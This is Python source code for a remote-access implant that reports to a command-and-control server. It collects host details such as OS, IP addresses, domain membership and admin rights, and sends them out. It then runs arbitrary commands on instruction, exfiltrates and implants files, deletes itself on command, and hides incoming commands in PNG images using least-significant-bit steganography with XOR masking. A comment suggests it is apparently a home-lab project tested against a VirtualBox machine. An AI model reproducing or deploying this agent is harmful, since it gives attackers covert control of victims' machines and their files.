import socket
import subprocess
import threading
import os
import sys
import platform
import shlex
import time
import numpy as np
from PIL import Image
from Crypto.Cipher import AES
import hashlib
if os.name == 'nt':
    from win32comext.shell import shell

exit_event = threading.Event()

UPLOAD_DIR = '.'
##################################
#Change this to whatever you like.  I'm using 127.0.0.1 because I'm port forwarding to virtualbox
##################################

def derive_key(password):
    return hashlib.sha256(password.encode()).digest()

def pad(data):
    pad_len = 16 - len(data) % 16
    return data + bytes([pad_len] * pad_len)

def unpad(data):
    pad_len = data[-1]
    return data[:-pad_len]

def encrypt(data, key):
    if isinstance(data, str):
        data = data.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data))
    return cipher.iv + ciphertext

def decrypt(enc_data, key):
    iv = enc_data[:16]
    ciphertext = enc_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext))
    return plaintext.decode('utf-8')

#################################
host="127.0.0.1"
port=4545
xor_key = 'abcd'
password = "abcd"
aes_key = derive_key(password)

#################################
def receiver(client):
    have_image = False
    while True:
        # Contigency: kill process if server not responding and remove the source code
        try:
            data=client.recv(1024)
            if not data:
                raise ValueError("Server disconnect!")
        except:
            print("server must have died...time to hop off")
            # os.remove(sys.argv[0])
            client.close()
            os._exit(0) 

        # data receive from server
        if have_image:
            data = xor_unmask(decode_msg(length = 26, input="cover.png"), xor_key)
            have_image = False
        else:
            data=data.decode('UTF-8') 
        
        # TASK LIST
        # msg: checking connection
        # whoami: get whoami info
        # shell: open a reverse shell (TODO)
        # command: run a command and send result back
        # self-destruct: stop this process, delete the source code file
        # upload: Implant new code/file to the system
        # download: Exfiltrate file from the system.

        # Msg
        if ":msg:" in data:
            print(data)
        
        # Whoami
        if ":whoami:" in data:
            whoami=os.getlogin()
            client.send(whoami.encode())
       
        # Open shell
        # if ":shell:" in data: #start the reverse shell!
        #     exit_event.clear()
            
        #     handler_thread2 = threading.Thread(target=startrevshellcli)
        #     handler_thread2.daemon = True
        #     handler_thread2.start()
        #     while not exit_event.is_set():
        #         time.sleep(1)

        # Execute given command
        if "c0mm@nd" in data:
            command=data.split("\n")
            command=command[1]
            if os.name == 'nt':
                command = "cmd.exe /c " + command
            print("command: ", command)
            command_list = shlex.split(command)
            proc = subprocess.Popen(command_list, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output=proc.stdout.read().decode().strip()
            output=output.encode()
            proc.stdin.close()
            proc.terminate()
                    
            client.sendall(b"returned output: \n"+output+b"\n:endofoutput:\n")
            
        # Kill the agent!
        if "self-destruct" in data: 
            os.remove(sys.argv[0])
            client.close()
            os._exit(0) 
        
        # Receive file from the server
        if ":upload:" in data:
            # Get command
            client.send(b"***Ready for upload to begin***!!\n")
            data=data.split(":")
            filename=data[2]
            filesize=int(data[3])
            filepath = UPLOAD_DIR + "/" + filename

            # Start thread to handle receive        
            exit_event.clear()
            handler_thread3 = threading.Thread(target=recfile, args=(client, filepath,filesize))
            handler_thread3.daemon = True
            handler_thread3.start()

            # Waiting for thread to done
            while not exit_event.is_set():
                time.sleep(1)
            
            if ".png" in filename:
                have_image = True
            # Send client done
            client.send(b"File successfully uploaded!\n")

        # SPECIFIC DATA EXFILTRATION
        if "~download~" in data:
            # Get command
            data=data.split("~")
            filepath = data[2]
            time.sleep(3)

            # Check filepath
            if not os.path.isfile(filepath):
                print(f"Error: File '{filepath}' does not exist.")
                client.send(b"error\n")
                time.sleep(3)
                continue
            client.send(b"OK\n")

            # Send filesize
            filename = os.path.basename(filepath)
            filesize = os.path.getsize(filepath)
            filesize=str(filesize)
            client.send(filesize.encode())
            time.sleep(2)

            # Send file
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    client.sendall(chunk)
                        
            time.sleep(3)

def recfile(client, filepath, filesize):
    # Receive file and write
    with open(filepath, 'wb') as f:
        received = 0
        while received < filesize:
            data = client.recv(4096)
            if not data:
                break
            if not "?keepalive?" in data.decode("UTF-8", errors="ignore"):
                f.write(data)
                received += len(data)
    exit_event.set()

def decode_msg(length = 8, input="cover.png", byte = True):
    # Open encoded image
    with Image.open(input) as img:
        width, height = img.size
        data = np.array(img)
        
    # Extract last bit and combine into byte
    data = np.reshape(data, width*height*3)
    data = data & 1 
    data = np.packbits(data)

    # Read and convert to string
    if not byte:
        res = ""
        for x in data:
            l = chr(x)
            if len(res) >= length:
                break
            res += l
        return res

    return bytes(data[:length])

def xor_unmask(masked_data, key):
    # Encode key to byte
    key = key.encode('utf-8')

    # Extend key if not equal to data
    if len(key) < len(masked_data):
        key = (key * (len(masked_data) // len(key) + 1))[:len(masked_data)]
    
    # Perform XOR unmasking (which is the same as masking)
    original_data = bytes([m ^ k for m, k in zip(masked_data, key)])
    
    # Attempt to decode
    try:
        return original_data.decode('utf-8')
    except UnicodeDecodeError:
        return original_data

########################################################
def main():
    OnADomain="False"
    LocalAdmin="False"

    # BASIC INFO EXFILTRATION
    # GET OS INFO
    # osinfo=subprocess.run("powershell.exe -command Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | findstr Microsoft", capture_output=True, text=True)
    # osinfo=osinfo.stdout.strip()
    osinfo = ("\nOS family: " + os.name + 
              "\nOS name: " + platform.system() + 
              "\nOS release: " + platform.release() + 
              "\nOS version: " + platform.version() + 
              "\nOS platform: " + platform.platform())

    if os.name == 'nt': # Window
        # GET IP INFO
        try:
            ipaddrinfo=subprocess.run("powershell.exe -command (Get-NetIPAddress -AddressFamily IPv4).IpAddress | findstr /V 169. | findstr /V 127.0.0.1", capture_output=True, text=True)
            ipaddrinfo=ipaddrinfo.stdout.strip()
        except:
            ipaddrinfo="No IP addresses active on system"

        # GET DOMAIN INFO
        try:
            domaininfo=subprocess.run("whoami /FQDN", capture_output=True, text=True)
            if "Unable" in domaininfo.stderr:
                OnADomain="False"
                print("[-] NOT domain joined")
            else:
                OnADomain="True"
                print("[+] domain joined!")
        except:
            print("[!] unexpected error...")

        # GET ADMIN INFO
        gathering=subprocess.run("net user " + os.environ.get('USERNAME'), capture_output=True, text=True)
        if "Administrators" in gathering.stdout:
            print("[+] members of local admins!")
            LocalAdmin="True"

        # COMBINE INFO
        if OnADomain == "True":    
            info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
        else:
            info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo

    else: # Linux
        # GET IP INFO
        try:
            ipaddrinfo = subprocess.run("ip -4 addr show | grep -oP '(?<=inet )\\d+(\\.\\d+){3}' | grep -v '^169\\.' | grep -v '^127.0.0.1'", capture_output=True, text=True, shell=True)
            ipaddrinfo=ipaddrinfo.stdout.strip()
        except:
            ipaddrinfo="No IP addresses active on system"


        # GET DOMAIN INFO
        try:
            domaininfo=subprocess.run(["hostname", "-f"], capture_output=True, text=True).stdout.strip()
            if "." in domaininfo:
                OnADomain="True"
                print("[+] domain joined!")
            else:
                OnADomain="False"
                print("[-] NOT domain joined")
        except:
            print("[!] unexpected error...")


        # GET SUDO INFO
        gathering=subprocess.run(["sudo", "-v"] , capture_output=True, text=True)
        if "Sorry" not in gathering.stdout:
            print("[+] members of local admins!")
            LocalAdmin="True"

        # COMBINE INFO
        info= domaininfo + "\\" + os.getlogin() + \
        "\nMember of Local Admins: " + LocalAdmin + \
        "\n" + "Domain Joined: " + OnADomain + \
        "\n" + "OS info: " + osinfo +\
        "\n" + "IP address info: " + "\n" + ipaddrinfo

    # CONNECT TO C2 Server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send(info.encode('UTF-8'))

    # START RECEIVER THREAD
    handler_thread = threading.Thread(target=receiver, args=(client, ))
    handler_thread.daemon=True
    handler_thread.start()

    #Keep it alive!!!
    while True:
        time.sleep(1)

if __name__ == '__main__':
    main()